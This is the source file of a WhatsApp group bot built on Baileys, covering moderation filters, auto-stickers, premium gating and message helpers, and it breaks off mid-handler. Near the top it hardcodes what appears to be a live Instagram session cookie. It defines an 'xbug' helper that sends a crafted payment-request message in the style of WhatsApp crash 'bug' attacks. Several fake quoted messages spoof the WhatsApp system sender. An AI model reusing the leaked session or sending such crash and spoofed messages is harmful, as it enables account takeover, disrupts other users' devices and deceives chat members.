require('./settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, Mimetype, generateWAMessage, prepareWAMessageMedia, prepareMessageFromContent,  areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const os = require('os')
const util = require('util')
const path = require('path')
const axios = require('axios')
const chalk = require('chalk')
const crypto = require('crypto')
const yts = require('youtube-yts')
const xfar = require('xfarr-api')
const request = require('request')
const xeontod = require("tod-api")
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const thiccysapi = require('textmaker-thiccy')
const QrCode = require('qrcode-reader')
const qrcode = require('qrcode')
const { buffergif } = require('./lib/myfunc2')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const google = require('google-it')
const { exec, spawn, execSync } = require("child_process")
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { jadibot, listJadibot } = require('./lib/rentbot')
const { performance } = require('perf_hooks')
const { igApi, getSessionId } = require('insta-fetcher');
let ig = new igApi("csrftoken=6wrPrUbsa05Csm9wlqxAOSqRwxxscjD;rur=16771\05427758921939\0541695476019:01f7994241f5e244ccf1bb676853d91b4f281e385e564f6c99a3592b27b0a39dada825e8;mid=Yy21jQALAAEmUl5E0beHHz_eVvyI;ds_user_id=27758921939;sessionid=27758921939%3ASGdS1WkMZToRfs%3A12%3AAYe5Sp23sp78pv0PnIRL6X-ySJdCDpe4uxbuJxtcxw;ig_did=09B76BA7-2D56-42E5-89BB-3584A9EAD69B");
ig.setCookie("csrftoken=6wrPrUbsa05Csm9wlqxAOSqRwxxscjD;rur=16771\05427758921939\0541695476019:01f7994241f5e244ccf1bb676853d91b4f281e385e564f6c99a3592b27b0a39dada825e8;mid=Yy21jQALAAEmUl5E0beHHz_eVvyI;ds_user_id=27758921939;sessionid=27758921939%3ASGdS1WkMZToRfs%3A12%3AAYe5Sp23sp78pv0PnIRL6X-ySJdCDpe4uxbuJxtcxw;ig_did=09B76BA7-2D56-42E5-89BB-3584A9EAD69B");
const maker = require('mumaker')
const textpro = require('./lib/textpro')
const { fetchBuffer } = require("./lib/myfunc2")
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const ini_mark = `0@s.whatsapp.net`
const ownernya = ownernomer + '@s.whatsapp.net'

//TIME
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var ucapanWaktu = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = `Good Morning 🌄`
 } 
 
// read database game
let tebaklagu = db.data.game.tebaklagu = []
let kuismath = db.data.game.math = []
let vote = db.data.others.vote = []

//read database jid
let premium = JSON.parse(fs.readFileSync('./database/user/premium.json'));
let banned = JSON.parse(fs.readFileSync('./database/user/banned.json'));
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'));
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'));
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'));
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'));
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'));
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'));
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'));
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'));
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'));
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'));
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));
let bad = JSON.parse(fs.readFileSync('./src/toxic/bad.json'));
let autorep =JSON.parse(fs.readFileSync('./database/autoreply.json'));

//database auto reply
let xeonysticker = JSON.parse(fs.readFileSync('./XtroidGallery/theme/Media-Store-Karne-Ke-Liye/sticker.json'));
let xeonyaudio = JSON.parse(fs.readFileSync('./XtroidGallery/theme/Media-Store-Karne-Ke-Liye/audio.json'));
let xeonyimage = JSON.parse(fs.readFileSync('./XtroidGallery/theme/Media-Store-Karne-Ke-Liye/image.json'));
let xeonyvideo = JSON.parse(fs.readFileSync('./XtroidGallery/theme/Media-Store-Karne-Ke-Liye/video.json'));

module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
    try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°${themeemoji}π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const sender = m.isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid
const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
const type = Object.keys(mek.message)[0]  
const from = mek.key.remoteJid      
const content = JSON.stringify(mek.message)

	    const cekUser = (users, id) => {     
var cek = null
Object.keys(user).forEach((i) => { 
if (user[i].id === id){ cek = i } })
if (cek !== null){ 
if (users == "id"){ return user[cek].id }
if (users == "emote"){ return user[cek].emote }
if (users == "timers"){ return user[cek].timers }
if (users == "hit"){ return user[cek].hit }
if (users == "star"){ return user[cek].star }
if (users == "alasan"){ return user[cek].alasan }
if (users == "ban"){ return user[cek].ban }
if (users == "premium"){ return user[cek].premium }
}
if (cek == null) return null
}
	
	         //media detect \\
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
     
        //hijack function
        const ordermessage = (m.msg.xtype === 'conversation' && m.msg.message.conversation) ? m.msg.message.conversation : (m.msg.xtype == 'imageMessage') && m.msg.message.imageMessage.caption ? m.msg.message.imageMessage.caption : (m.msg.xtype == 'videoMessage') && m.msg.message.videoMessage.caption ? m.msg.message.videoMessage.caption : (m.msg.xtype == 'extendedTextMessage') && m.msg.message.extendedTextMessage.text.startsWith(prefix) ? m.msg.message.extendedTextMessage.text : (m.msg.xtype == 'buttonsResponseMessage') && m.msg.message.buttonsResponseMessage.selectedButtonId.startsWith(prefix) ? m.msg.message.buttonsResponseMessage.selectedButtonId : (m.msg.xtype == 'listResponseMessage') && m.msg.message.listResponseMessage.singleSelectReply.selectedRowId.startsWith(prefix) ? m.msg.message.listResponseMessage.singleSelectReply.selectedRowId : (m.msg.xtype == 'templateButtonReplyMessage') && m.msg.message.templateButtonReplyMessage.selectedId.startsWith(prefix) ? m.msg.message.templateButtonReplyMessage.selectedId : ''   
        const order = ordermessage.slice(0).trim().split(/ +/).shift().toLowerCase()	   
	 
	
	    //Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=94719225807:94719225807\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./XtroidGallery/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
		
	
// Group
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
	    const isBan = banned.includes(m.sender)
        const isPremium = premium.includes(m.sender)
        const Autoreply = m.isGroup ? autorep.includes(from) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
        const solot = [
		'🍊 : 🍒 : 🍐',
		'🍒 : 🔔 : 🍊',
		'🍇 : 🍇 : 🍇',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍐 : 🍐 : 🍐',
		'🍊 : 🍒 : 🍒',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍐 : 🔔 : 🔔',
		'🍊 : 🍋 : 🍒',
		'🍋 : 🍋 : 🍌',
		'🔔 : 🔔 : 🍇',
		'🔔 : 🍐 : 🍇',
		'🔔 : 🔔 : 🔔  Win',
		'🍒 : 🍒 : 🍒 Win',
		'🍌 : 🍌 : 🍌 Lose'
		]

//afk and other
try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
            
    let chats = global.db.data.chats[m.chat]
    if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
    if (chats) {
if (!('mute' in chats)) chats.mute = false
if (!('antilink' in chats)) chats.antilink = false
    } else global.db.data.chats[m.chat] = {
mute: false,
antilink: false,
    }
    
    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false	
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
//function leveling & pick
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

// Public & Self
if (!XeonBotInc.public) {
    if (!m.key.fromMe) return
}
function randomNomor(angka){
return Math.floor(Math.random() * angka) + 1
}
const hsjdh = randomNomor(5)

//auto react all message
/////XeonBotInc.sendMessage(m.chat, {
          ////react: {
            ////////////////////////////////////////text: `${pickRandom(['😨','😅','😂','😳','😎', '🥵', '😱', '🐦', '🙄', '🐤','🗿','🐦','🤨','🥴','😐','👆','😔', '👀','👎'])}`,
            ////key: m.key,
          /////}})

//auto recording all
    if (global.autoRecord) { if (m.chat) { XeonBotInc.sendPresenceUpdate('recording', m.chat) }
}
//autotyper all
  if (global.autoTyping) { if (m.chat) { XeonBotInc.sendPresenceUpdate('composing', m.chat) }
}

// total hit
        global.hit = {}
if (isCmd) {
data = await fetchJson('https://api.countapi.xyz/hit/XeonBotInc-md/visits')
jumlahcmd = `${data.value}`
dataa = await fetchJson(`https://api.countapi.xyz/hit/XeonBotInc-md${moment.tz('Asia/Kolkata').format('DDMMYYYY')}/visits`)
jumlahharian = `${dataa.value}`
}

//premium
const prem1 = `Hi bro  ${pushname} ${ucapanWaktu} \n\nThis feature is for premium members only, please buy premium to use this feature`
const prem2 = `Click the button below to buy premium`
const prem3 = [{buttonId: `${prefix}buypreim`,buttonText: {displayText: `BUY PREMIUM`,},type: 1,},]
blomdaftar = `${ucapanWaktu} @${sender.split("@")[0]} Kamu belum terdaftar di database cek private message mu untuk mendaftar`
limitabis = `*[YOUR LIMIT IS EXPIRED]*\nBuy limit in ${prefix}buylimit or buy premium to get unlimited limit`

//WARRRRRRR
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false
}}}
const xbug = (teks) => {
  XeonBotInc.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
//-------------------End--------------------\\
//Dont edit ot recode or bug wont work

const fmedia =  {
  key : {
    fromMe: false,
participant : '0@s.whatsapp.net'
},
     contextInfo: {
    forwardingScore: 9999,
    isForwarded: false, //:'v
showAdAttribution: true,
title: botname,
mediaType: "VIDEO",
mediaUrl: websitex,
previewType: "PHOTO",
thumbnail: thumb,
sourceUrl: "",
detectLinks: false,
    }}
    
    //reply fake
	//group target \\
const reply = (teks) => {
           XeonBotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XtroidGallery/theme/cheemspic.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }

	//button
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const butonna = {
text: text1,
footer: desc1,
buttons: but,
headerType: 1
}
XeonBotInc.sendMessage(id, butonna, options)
}
const http = randomNomor(500)

//document
const kontol = {
	key : {
   participant : '0@s.whatsapp.net'
},
       message: {
    documentMessage: {
    title: `${pushname}`, 
    jpegThumbnail: thumb
  }
}
      }
sendMenuDoc = async (ID, doc, fileName, fileLength, caption, footer, time, buttons, boddy, thumbnail, thumbnailUrl, sourceUrl, mediaUrl, options) => {
let buttonMessage = {
  document: doc,
  mimetype: "application/pdf",
  fileName: fileName,
  fileLength: fileLength,
  caption: caption,
  footer: footer,
  buttons: buttons,
  headerType: 4,
  contextInfo:{externalAdReply:{
     title: time,
     body: boddy,
     thumbnail: thumbnail,
     thumbnailUrl: thumbnailUrl,
     sourceUrl: sourceUrl,
     mediaUrl: mediaUrl,  
     renderLargerThumbnail: true,
     showAdAttribution: true,
     mediaType: 1
   }}
       }
   XeonBotInc.sendMessage(m.chat, buttonMessage, options)
   }
                
        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await XeonBotInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await XeonBotInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        // Anti Link
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return m.reply(`${mess.botAdmin}, to kick the person who send link`)
        let gclink = (`https://chat.whatsapp.com/`+await XeonBotInc.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`})
        if (isAdmins) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`})
        if (isCreator) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`})
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			XeonBotInc.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending group link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }
        
          // Antiwame by xeon
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirtex by xeon
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return m.reply(mess.botAdmin)
          await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			XeonBotInc.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by xeon
if (antiToxic)
if (bad.includes(messagesD)) {
tos = ['Hey, watch your mouth','Never been taught how to speak?','Stop being toxic my friend🤢','Dont be toxic🧧']
sin =  tos[Math.floor(Math.random() * (tos.length))]
m.reply(sin)
if (m.text) {
bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin that's why i won't kick you😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
//antilink youtube video by xeon
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by xeon
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by xeon
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
